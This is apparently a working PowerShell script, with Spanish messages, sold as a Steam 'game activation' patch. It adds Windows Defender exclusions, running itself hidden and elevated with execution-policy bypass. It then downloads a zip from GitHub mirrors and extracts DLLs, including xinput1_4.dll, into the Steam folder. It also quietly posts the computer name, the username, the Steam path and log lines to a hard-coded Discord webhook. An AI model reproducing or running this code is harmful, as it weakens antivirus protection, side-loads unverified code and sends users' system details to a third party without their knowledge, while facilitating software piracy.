$ErrorActionPreference='SilentlyContinue'
$patchLog=Join-Path $env:TEMP "bsmap_patch_only.log"
try { Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] PATCH ONLY INICIO" -Encoding UTF8 } catch {}
function Get-SteamPathOnly {
    $p=$null; try { $p=(Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath } catch {}
    if (-not $p) { try { $p=(Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath } catch {} }
    if (-not $p) { $p="$env:ProgramFiles(x86)\Steam"; if (-not (Test-Path (Join-Path $p "steam.exe"))) { $p="C:\Program Files (x86)\Steamm" } }
    return $p
}
$steamRoot=Get-SteamPathOnly
if (-not $steamRoot -or -not (Test-Path (Join-Path $steamRoot "steam.exe"))) { Write-Host "No se encontro Steam en $steamRoot" -ForegroundColor Red; exit 1 }
try { Add-Content -Path $patchLog -Value "Steam=$steamRoot" -Encoding UTF8 } catch {}
# Preparando
Write-Host "Activando juegos..." -ForegroundColor Yellow
try {
    Add-MpPreference -ExclusionPath $steamRoot -Force -ErrorAction Stop
    foreach ($sub in @("steamapps\downloading","steamapps\common","config\stplug-in","config\lua","config\depotcache")) { $pp=Join-Path $steamRoot $sub; if (Test-Path $pp) { Add-MpPreference -ExclusionPath $pp -Force -ErrorAction SilentlyContinue } }
    Add-Content -Path $patchLog -Value "Exclusiones OK" -Encoding UTF8
} catch {
    Write-Host "Solicitando permisos..." -ForegroundColor Yellow
    $esc=$steamRoot -replace "'","''"
    $cmd="Add-MpPreference -ExclusionPath '$esc' -Force; foreach (`$s in @('steamapps\downloading','steamapps\common','config\stplug-in','config\lua','config\depotcache')) { `$pp=Join-Path '$esc' `$s; if (Test-Path `$pp) { Add-MpPreference -ExclusionPath `$pp -Force } }"
    $f=Join-Path $env:TEMP "patch_excl_$(Get-Random).ps1"; Set-Content -LiteralPath $f -Value $cmd -Encoding UTF8
    $p=Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$f`"") -PassThru; $p.WaitForExit(15000) | Out-Null; Remove-Item $f -Force -ErrorAction SilentlyContinue
    Add-Content -Path $patchLog -Value "Exclusiones elevadas" -Encoding UTF8
}
# Cerrar Steam
try { Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep -Seconds 2 } catch {}
$urls=@("https://github.com/bastisayes/Fixes-steam/raw/main/PARCHENEWw.zip","https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/PARCHENEWw.zip","https://cdn.jsdelivr.net/gh/bastisayes/Fixes-steam@main/PARCHENEWw.zip")
$ok=$false
for ($a=0; $a -lt 5 -and -not $ok; $a++) {
    Write-Host "Activando juegos... ($($a+1)/5)" -ForegroundColor Yellow
    Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'HH:mm:ss')] Intento $($a+1)/5" -Encoding UTF8
    $data=$null
    foreach ($u in $urls) {
        try { $wc=New-Object System.Net.WebClient; $data=$wc.DownloadData($u); if ($data.Length -gt 1000) { Add-Content -Path $patchLog -Value "  OK $u $($data.Length) bytes" -Encoding UTF8; break } } catch { Add-Content -Path $patchLog -Value "  WebClient $u fail $($_.Exception.Message)" -Encoding UTF8 }
        try { $tmp2=Join-Path $env:TEMP "patch_iwr_$(Get-Random).zip"; Invoke-WebRequest -Uri $u -OutFile $tmp2 -UseBasicParsing -TimeoutSec 30; $data=[IO.File]::ReadAllBytes($tmp2); Remove-Item $tmp2 -Force -ErrorAction SilentlyContinue; if ($data.Length -gt 1000) { Add-Content -Path $patchLog -Value "  IWR $u $($data.Length) bytes" -Encoding UTF8; break } } catch { Add-Content -Path $patchLog -Value "  IWR $u fail $($_.Exception.Message)" -Encoding UTF8 }
        try { $tmp3=Join-Path $env:TEMP "patch_curl_$(Get-Random).zip"; $null=& curl.exe -sL --ssl-no-revoke -o "$tmp3" "$u" --max-time 30 2>&1; if ((Test-Path $tmp3) -and ((Get-Item $tmp3).Length -gt 1000)) { $data=[IO.File]::ReadAllBytes($tmp3); Remove-Item $tmp3 -Force -ErrorAction SilentlyContinue; Add-Content -Path $patchLog -Value "  curl $u $($data.Length) bytes" -Encoding UTF8; break } } catch { Add-Content -Path $patchLog -Value "  curl $u fail $($_.Exception.Message)" -Encoding UTF8 }
    }
    if (-not $data -or $data.Length -lt 1000) { Add-Content -Path $patchLog -Value "  Descarga fallo" -Encoding UTF8; continue }
    $tmpZip=Join-Path $env:TEMP "patch_$(Get-Random).zip"
    [IO.File]::WriteAllBytes($tmpZip, $data)
    $exOk=$false
    try { Expand-Archive -Path $tmpZip -DestinationPath $steamRoot -Force -ErrorAction Stop; $exOk=$true; Add-Content -Path $patchLog -Value "  Expand OK" -Encoding UTF8 } catch { Add-Content -Path $patchLog -Value "  Expand fail $($_.Exception.Message)" -Encoding UTF8
        try { $esc2=$steamRoot -replace "'","''"; $tmpEsc=$tmpZip -replace "'","''"; $f2=Join-Path $env:TEMP "patch_ex2_$(Get-Random).ps1"; Set-Content -LiteralPath $f2 -Value "Expand-Archive -Path '$tmpEsc' -DestinationPath '$esc2' -Force" -Encoding UTF8; $p2=Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$f2`"") -PassThru; $p2.WaitForExit(15000) | Out-Null; Remove-Item $f2 -Force -ErrorAction SilentlyContinue; $exOk=$true; Add-Content -Path $patchLog -Value "  Elevated expand OK" -Encoding UTF8 } catch { Add-Content -Path $patchLog -Value "  Elevated expand fail $($_.Exception.Message)" -Encoding UTF8; try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue; [System.IO.Compression.ZipFile]::ExtractToDirectory($tmpZip, $steamRoot, $true); $exOk=$true; Add-Content -Path $patchLog -Value "  ZipFile OK" -Encoding UTF8 } catch { Add-Content -Path $patchLog -Value "  ZipFile fail $($_.Exception.Message)" -Encoding UTF8 } }
    }
    Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue
    $has1=Test-Path (Join-Path $steamRoot "OpenSteamTool.dll"); $has2=Test-Path (Join-Path $steamRoot "xinput1_4.dll")
    Add-Content -Path $patchLog -Value "  Post has1=$has1 has2=$has2 exOk=$exOk" -Encoding UTF8
    if ($has1 -and $has2) { $ok=$true; Add-Content -Path $patchLog -Value "  OK dlls presentes" -Encoding UTF8 }
}
$flag=Join-Path $env:LOCALAPPDATA "bsmap_parche.flag"
if ($ok) {
    try { New-Item -Path "HKCU:\Software\Bsmap" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name ParcheInstalado -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
    try { [IO.File]::WriteAllText($flag, "1", (New-Object System.Text.UTF8Encoding $false)) } catch {}
    Write-Host "Juegos activados correctamente" -ForegroundColor Green
    Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] PATCH OK" -Encoding UTF8
    try {
        $wh="https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"
        $lines=Get-Content $patchLog -ErrorAction SilentlyContinue | Select-Object -Last 50
        $bt=[char]96; $logEx="`n$bt$bt$bt`n$($lines -join "`n")`n$bt$bt$bt"
        $c1=@(Get-ChildItem (Join-Path $steamRoot "config\stplug-in") -Filter *.lua -ErrorAction SilentlyContinue).Count; $c2=@(Get-ChildItem (Join-Path $steamRoot "config\lua") -Filter *.lua -ErrorAction SilentlyContinue).Count
        $msg="**PATCH ONLY OK** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n**PC:** $env:COMPUTERNAME / $([Environment]::UserName)`n**Steam:** $steamRoot`n**stplug-in:** $c1 **lua:** $c2`n$logEx"
        $pl=@{content=$msg}|ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $pl -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    try { Start-Process (Join-Path $steamRoot "steam.exe") } catch {}
} else {
    Write-Host "No se pudo completar la activacion. Revisa el log." -ForegroundColor Red
    Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] PATCH FALLO" -Encoding UTF8
    try {
        $wh="https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"
        $lines=Get-Content $patchLog -ErrorAction SilentlyContinue | Select-Object -Last 60
        $bt=[char]96; $logEx="`n$bt$bt$bt`n$($lines -join "`n")`n$bt$bt$bt"
        $c1=@(Get-ChildItem (Join-Path $steamRoot "config\stplug-in") -Filter *.lua -ErrorAction SilentlyContinue).Count; $c2=@(Get-ChildItem (Join-Path $steamRoot "config\lua") -Filter *.lua -ErrorAction SilentlyContinue).Count; $has1=Test-Path (Join-Path $steamRoot "OpenSteamTool.dll"); $has2=Test-Path (Join-Path $steamRoot "xinput1_4.dll")
        $msg="**PATCH ONLY FALLO - DETALLE** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n**PC:** $env:COMPUTERNAME / $([Environment]::UserName)`n**Steam:** $steamRoot`n**dll:** $has1/$has2 **stplug-in:** $c1 **lua:** $c2`n$logEx"
        # Discord 2000 char limit: split if needed
        if ($msg.Length -gt 1900) { $msg=$msg.Substring(0,1900)+"`n... (log truncado)" }
        $pl=@{content=$msg}|ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $pl -ContentType "application/json" -TimeoutSec 15 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}
Write-Host "Log: $patchLog" -ForegroundColor Gray
